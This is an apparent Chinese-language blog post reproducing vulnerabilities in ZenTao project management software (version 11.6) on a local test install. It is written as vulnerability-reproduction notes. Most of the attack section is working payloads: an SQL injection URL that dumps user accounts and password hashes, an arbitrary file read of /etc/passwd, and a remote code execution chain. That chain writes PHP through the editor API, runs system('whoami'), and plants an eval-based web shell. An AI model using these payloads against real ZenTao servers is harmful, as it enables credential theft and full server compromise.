---
title: 禅道全版本rce漏洞复现笔记
date: 2020-07-11 18:54:56
categories:
  - 漏洞复现
tags:
  - 漏洞
  - RCE
  - 漏洞复现
  - 禅道
  - zentao
author: Chace
---

## 漏洞说明

[禅道项目管理软件](https://www.zentao.net/)是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。
此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响。本次漏洞复现以ZenTaoPMS.11.6版本作为演示

<!--more-->
## 环境搭建

下载链接：https://www.zentao.net/download/80153.html

解压安装后访问禅道主页 http://127.0.0.1/index.php

![](1.png)

查看当前版本 http://127.0.0.1:81/zentao/index.php?mode=getconfig

![](2.png)

至此环境搭建成功

## 漏洞复现
### 漏洞1 SQL注入

首先我们登录admin/CD87691043cs账户修改默认密码，创建一个普通Test0001/1qaz2wsx3edc!@#$用户并登录

>  Payload 

```
http://127.0.0.1/zentao/api-getModel-api-sql-sql=select+account,password+from+zt_user
```

Poc访问结果如下：

![](3.png)

### 漏洞2 文件读取

> Payload 

```
http://127.0.0.1/zentao/api-getModel-file-parseCSV-fileName=/etc/passwd
```

Poc访问结果如下：

![](4.png)

由于本地环境是window系统，所以没有回显，我们在xampp\zentao\module\api目录下新建一个test文件，读取

```
http://127.0.0.1/zentao/api-getModel-file-parseCSV-fileName=test
```

![](5.png)



### 漏洞3 RCE

利用上面的文件读取来执行命令

> Payload1

```http
POST /zentao/api-getModel-editor-save-filePath=1111 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: lang=zh-cn; device=desktop; theme=default; windowWidth=2426; windowHeight=796; zentaosid=vqruohhgn7qbhveakg04h9e267
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

fileContent=<?php phpinfo()?>
```

![](6.png)

先写入一个phpinfo，再读取访问

需要给物理路径加上一层才能包含成功

```
http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=1111/1
```

![](7.png)

> Payload2

```
fileContent=<?php system('whoami');?>
```

![](8.png)

![](9.png)


> Payload3(一句话)
```
fileContent=<?php file_put_contents('E://CMS/ZenTaoPMS/xampp/zentao/www/xxx.php.aaa', '<?php @eval($_REQUEST["x"]);?>');?>
```

![](10.png)

这里是window系统，所以写入绝对路径，绝对路径可以同样用`fileContent=<?php getcwd()?>`获取

```
http://127.0.0.1/zentao/xxx.php.aaa?x=phpinfo();
```

![](11.png)

*PS:最好使用linux系统安装，windows不要使用一键安装包安装，windows系统安装集成版的话根目录下的php代码好像做了限制，无法执行。*

## 参考链接

[【渗透笔记】禅道](https://www.jianshu.com/p/62bb128ecbdb)

[禅道全版本rce漏洞分析](http://foreversong.cn/archives/1410)